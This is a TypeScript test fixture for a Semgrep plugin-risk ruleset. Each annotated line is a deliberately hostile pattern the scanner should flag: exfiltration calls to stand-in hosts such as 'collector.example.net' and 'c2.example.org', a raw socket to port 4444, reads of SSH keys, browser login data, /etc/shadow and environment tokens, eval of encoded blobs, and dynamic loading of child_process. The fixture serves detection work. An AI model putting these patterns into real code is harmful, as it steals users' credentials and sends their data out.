// A plugin that does everything .semgrep/plugin-risk.yml looks for. Every
// `ruleid:` line must be reported (semgrep --test); nothing here runs.
// ruleid: vestra-child-process
import { execFile } from "node:child_process";
// ruleid: vestra-child-process
import * as cluster from "cluster";
// ruleid: vestra-dynamic-code
import vm from "node:vm";
// ruleid: vestra-raw-network
import { connect } from "node:net";
// ruleid: vestra-native-addon
import inspector from "node:inspector";
import { homedir } from "node:os";
import os from "node:os";
import { Worker } from "node:worker_threads";

declare const plugin: { dataDirectory: string };
declare const payload: string;
declare const name: string;

export async function run() {
  execFile("calc.exe");
  // ruleid: vestra-child-process
  const cp = require("child_process");
  // ruleid: vestra-dynamic-code
  eval(payload);
  // ruleid: vestra-dynamic-code
  const f = new Function("a", payload);
  // ruleid: vestra-dynamic-code
  setTimeout("steal()", 10);
  // ruleid: vestra-dynamic-code
  new Worker(payload, { eval: true });
  vm.runInNewContext(payload);
  // ruleid: vestra-dynamic-import
  await import(name);
  // ruleid: vestra-dynamic-import
  require(`./${name}`);
  // ruleid: vestra-native-addon
  require("./build/Release/evil.node");
  // ruleid: vestra-native-addon
  process.dlopen({ exports: {} }, plugin.dataDirectory + "/x.node");
  // ruleid: vestra-network-host
  await fetch("https://collector.example.net/upload", { method: "POST" });
  // ruleid: vestra-network-host
  connect(4444, "203.0.113.7");
  // ruleid: vestra-network-host
  new WebSocket(`wss://c2.example.org/${name}`);
  // ruleid: vestra-path-outside-plugin
  const home = homedir();
  // ruleid: vestra-path-outside-plugin
  const profile = os.homedir();
  // ruleid: vestra-path-outside-plugin
  const appData = process.env.APPDATA;
  // ruleid: vestra-path-outside-plugin
  const shadow = "/etc/shadow";
  // ruleid: vestra-path-outside-plugin
  const system = "C:\\Windows\\System32";
  // ruleid: vestra-path-outside-plugin
  const up = plugin.dataDirectory + "/../../other-plugin";
  // ruleid: vestra-credentials
  const ssh = home + "/.ssh/id_rsa";
  // ruleid: vestra-credentials
  const chrome = "Google/Chrome/User Data/Default/Login Data";
  // ruleid: vestra-credentials
  const token = process.env.GITHUB_TOKEN;
  // ruleid: vestra-credentials
  const everything = JSON.stringify(process.env);
  // ruleid: vestra-obfuscation
  const blob = "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQ=";
  // ruleid: vestra-dynamic-code, vestra-obfuscation
  eval(atob(blob));
  // ruleid: vestra-obfuscation
  const hidden = String.fromCharCode(114, 101, 113, 117, 105, 114, 101, 40);
  return [cp, f, home, profile, appData, shadow, system, up, ssh, chrome, token, everything, hidden, cluster, inspector];
}

// Other ways to reach a module, to run code, and to send the environment.
// ruleid: vestra-child-process
export { spawn as start } from "node:child_process";
// ruleid: vestra-child-process
export * from "child_process";
// ruleid: vestra-raw-network
export * as sockets from "node:dgram";

declare const module: { require(id: string): unknown };
declare const url: string;

export function more() {
  // ruleid: vestra-child-process, vestra-dynamic-import
  const cp = process.getBuiltinModule("node:child_process");
  // ruleid: vestra-raw-network, vestra-dynamic-import
  const net = process.getBuiltinModule("net");
  // ruleid: vestra-dynamic-import
  const fs = process.getBuiltinModule("node:fs");
  // ruleid: vestra-dynamic-import
  const https = process.getBuiltinModule("https");
  // ruleid: vestra-dynamic-import
  const threads = process.getBuiltinModule("node:worker_threads");
  // ruleid: vestra-dynamic-import
  const any = process.getBuiltinModule(name);
  // ruleid: vestra-child-process, vestra-dynamic-import
  const viaModule = module.require("child_process");
  // ruleid: vestra-child-process, vestra-dynamic-import
  const viaMain = process.mainModule.require("node:child_process");
  // ruleid: vestra-dynamic-import
  const loaded = (require("module") as { _load(id: string): unknown })._load(name);
  const flag = true;
  // ruleid: vestra-dynamic-code
  new Worker(payload, { eval: flag });
  // ruleid: vestra-dynamic-code
  new Worker(new URL("data:text/javascript,process.exit(1)"));
  // ruleid: vestra-dynamic-code
  new Worker(URL.createObjectURL(new Blob([payload])));
  // ruleid: vestra-credentials
  execFile("node", [], { env: { ...process.env, EXTRA: "1" } });
  // ruleid: vestra-credentials
  fetch(url, { method: "POST", body: JSON.stringify({ env: process.env }) });
  return [cp, net, fs, https, threads, any, viaModule, viaMain, loaded];
}
